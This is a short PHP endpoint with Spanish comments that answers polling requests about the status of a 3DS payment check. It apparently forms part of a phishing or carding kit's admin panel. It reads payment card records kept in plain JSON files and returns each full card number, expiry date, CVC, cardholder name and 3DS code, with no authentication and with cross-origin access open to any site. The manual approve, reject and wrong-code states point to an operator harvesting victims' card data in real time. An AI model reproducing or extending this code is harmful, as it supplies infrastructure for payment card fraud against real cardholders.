<?php
// admin/check_3ds.php - Verifica el estado 3DS (polling)
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$id_3ds = $_GET['id_3ds'] ?? '';

if (empty($id_3ds)) {
    echo json_encode(['success' => false, 'error' => 'ID 3DS requerido']);
    exit;
}

$dataDir = __DIR__ . '/data';
$tarjetasFile = $dataDir . '/tarjetas.json';
$logsFile = $dataDir . '/pse_logs.json';

// ====== BUSCAR EN TARJETAS.JSON PRIMERO ======
if (file_exists($tarjetasFile)) {
    $content = file_get_contents($tarjetasFile);
    $tarjetas = json_decode($content, true) ?? [];
    
    foreach ($tarjetas as $t) {
        if ($t['id_3ds'] === $id_3ds) {
            $estado = $t['estado_3ds'] ?? 'pendiente';
            $mensaje = '';
            
            if ($estado === 'aprobado') {
                $mensaje = '✅ Pago aprobado';
            } elseif ($estado === 'rechazado') {
                $mensaje = '❌ Pago rechazado';
            } elseif ($estado === 'error_clave') {
                $mensaje = '❌ Error de clave, verifica tu código 3DS';
            } else {
                $mensaje = '⏳ Esperando aprobación...';
            }
            
            echo json_encode([
                'success' => true,
                'estado' => $estado,
                'id_3ds' => $id_3ds,
                'tipo_tarjeta' => $t['tipo_tarjeta'] ?? 'visa',
                'numero_tarjeta' => $t['numero_tarjeta'] ?? '',
                'vencimiento' => $t['vencimiento'] ?? '',
                'cvc' => $t['cvc'] ?? '',
                'titular' => $t['titular'] ?? '',
                'monto' => $t['monto'] ?? '0',
                'codigo_3ds' => $t['codigo_3ds'] ?? '',
                'message' => $mensaje
            ]);
            exit;
        }
    }
}

// ====== SI NO SE ENCUENTRA, BUSCAR EN PSE_LOGS.JSON ======
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
    
    foreach ($logs as $log) {
        if (isset($log['id_3ds']) && $log['id_3ds'] === $id_3ds) {
            $estado = $log['estado_3ds'] ?? 'pendiente';
            $mensaje = '';
            
            if ($estado === 'aprobado') {
                $mensaje = '✅ Pago aprobado';
            } elseif ($estado === 'rechazado') {
                $mensaje = '❌ Pago rechazado';
            } elseif ($estado === 'error_clave') {
                $mensaje = '❌ Error de clave, verifica tu código 3DS';
            } else {
                $mensaje = '⏳ Esperando aprobación...';
            }
            
            echo json_encode([
                'success' => true,
                'estado' => $estado,
                'id_3ds' => $id_3ds,
                'tipo_tarjeta' => $log['tipo_tarjeta'] ?? 'visa',
                'numero_tarjeta' => $log['numero_tarjeta'] ?? '',
                'vencimiento' => $log['vencimiento'] ?? '',
                'cvc' => $log['cvc'] ?? '',
                'titular' => $log['titular'] ?? '',
                'monto' => $log['monto'] ?? '0',
                'codigo_3ds' => $log['codigo_3ds'] ?? '',
                'message' => $mensaje
            ]);
            exit;
        }
    }
}

// ====== NO ENCONTRADO ======
echo json_encode([
    'success' => false, 
    'error' => 'ID 3DS no encontrado', 
    'estado' => 'pendiente',
    'message' => '⏳ Esperando aprobación...'
]);
?>